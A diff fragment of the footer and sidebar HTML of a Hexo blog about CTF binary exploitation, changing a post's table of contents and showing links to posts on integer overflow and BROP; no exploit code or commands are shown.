-<div id="paginator"></div></div><div id="post-footer"><div id="pages"><div class="footer-link" style="width: 50%;text-align:right;border-right:1px #fe2 solid"><a href="/2024/10/24/pwn/other/integer/">← Next 整数溢出</a></div><div class="footer-link" style="width: 50%;right:1px;border-left:1px #fe2 solid"><a href="/2024/10/24/pwn/stack/brop/">BROP Prev →</a></div></div></div><div id="comments"><div id="gitalk"></div></div></div><div class="bottom-btn"><div><a class="i-top" id="to-top" onClick="scrolls.scrolltop();" title="To Top" style="opacity: 0; display: none;">∧ </a><a class="i-index" id="to-index" href="#toc-div" title="To Catalog">≡</a><a class="i-color" id="color-mode" onClick="colorMode.change()" title="Change Theme"></a></div></div></article><aside><div id="about"><a href="/" id="logo"><img src="/img/faction/1.png" alt="Logo"></a><h1 id="Dr"><a href="/">南行</a></h1><div id="description"><p></p></div><div id="social-links"><a class="social" target="_blank" rel="noopener" href="https://github.com/nanhang-950"><i class="fab fa-github" alt="GitHub"></i></a><a class="social" href="mailto:2122295973@qq.com"><i class="fa fa-envelope" alt="E-Mail"></i></a></div></div><div id="aside-block"><div id="toc-div"><h1>Catalog</h1><ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%8E%9F%E7%90%86"><span class="toc-number">1.</span> <span class="toc-text">原理</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%A0%88%E4%B8%8A%E8%BF%81%E7%A7%BB"><span class="toc-number">2.</span> <span class="toc-text">栈上迁移</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E8%BF%81%E7%A7%BB%E5%88%B0bss%E6%AE%B5"><span class="toc-number">3.</span> <span class="toc-text">迁移到bss段</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%BE%8B%E9%A2%98"><span class="toc-number">4.</span> <span class="toc-text">例题</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%90%8E%E8%A8%80"><span class="toc-number">5.</span> <span class="toc-text">后言</span></a></li></ol></div></div><footer><nobr>Published with <a target="_blank" rel="noopener" href="http://hexo.io">Hexo</a></nobr><wbr><nobr> Theme <a target="_blank" rel="noopener" href="https://github.com/Yue-plus/hexo-theme-arknights">Arknights</a></nobr><wbr><nobr> by <a target="_blank" rel="noopener" href="https://github.com/Yue-plus">Yue_plus</a></nobr></footer></aside></main><canvas id="canvas-dust"></canvas></body></html>
+<div id="paginator"></div></div><div id="post-footer"><div id="pages"><div class="footer-link" style="width: 50%;text-align:right;border-right:1px #fe2 solid"><a href="/2024/10/24/pwn/other/integer/">← Next 整数溢出</a></div><div class="footer-link" style="width: 50%;right:1px;border-left:1px #fe2 solid"><a href="/2024/10/24/pwn/stack/brop/">BROP Prev →</a></div></div></div><div id="comments"><div id="gitalk"></div></div></div><div class="bottom-btn"><div><a class="i-top" id="to-top" onClick="scrolls.scrolltop();" title="To Top" style="opacity: 0; display: none;">∧ </a><a class="i-index" id="to-index" href="#toc-div" title="To Catalog">≡</a><a class="i-color" id="color-mode" onClick="colorMode.change()" title="Change Theme"></a></div></div></article><aside><div id="about"><a href="/" id="logo"><img src="/img/faction/1.png" alt="Logo"></a><h1 id="Dr"><a href="/">南行</a></h1><div id="description"><p></p></div><div id="social-links"><a class="social" target="_blank" rel="noopener" href="https://github.com/nanhang-950"><i class="fab fa-github" alt="GitHub"></i></a><a class="social" href="mailto:2122295973@qq.com"><i class="fa fa-envelope" alt="E-Mail"></i></a></div></div><div id="aside-block"><div id="toc-div"><h1>Catalog</h1><ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%AE%80%E4%BB%8B"><span class="toc-number">1.</span> <span class="toc-text">简介</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%8E%9F%E7%90%86"><span class="toc-number">2.</span> <span class="toc-text">原理</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%BE%8B%E9%A2%98"><span class="toc-number">3.</span> <span class="toc-text">例题</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%90%8E%E8%A8%80"><span class="toc-number">4.</span> <span class="toc-text">后言</span></a></li></ol></div></div><footer><nobr>Published with <a target="_blank" rel="noopener" href="http://hexo.io">Hexo</a></nobr><wbr><nobr> Theme <a target="_blank" rel="noopener" href="https://github.com/Yue-plus/hexo-theme-arknights">Arknights</a></nobr><wbr><nobr> by <a target="_blank" rel="noopener" href="https://github.com/Yue-plus">Yue_plus</a></nobr></footer></aside></main><canvas id="canvas-dust"></canvas></body></html>
